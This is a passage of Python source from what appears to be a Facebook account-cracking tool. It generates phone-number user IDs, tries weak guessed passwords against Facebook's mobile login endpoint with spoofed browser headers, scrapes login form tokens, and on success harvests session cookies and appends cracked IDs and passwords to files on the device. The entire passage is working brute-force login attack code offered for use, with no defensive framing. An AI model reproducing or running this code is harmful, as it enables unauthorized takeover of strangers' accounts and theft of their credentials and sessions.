        print(f" {WHITE}NUMBER YOU PUT        : {WHITE}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{WHITE} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{WHITE}==========================================================')
        for love in user:
            uid = code+love
            pwx = [love,'786786']
            manshera.submit(free1,uid,pwx,tl)
def free1(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[FROG_BABA ðŸ”¥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
})
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                print('\r\033[1;32m[RAKIB-OK] '+uid+' [âˆš] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[RAKIB] '+uid+' [~] '+ps+' ')
                    open('/sdcard/RAKIB.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[RAKIB-CP] '+uid+' [Ã—] '+ps+ ' ')
                    open('/sdcard/RAKIB.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        checks(ok,cp)
    except:
        pass
 
 
 
#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    menu_apikey() 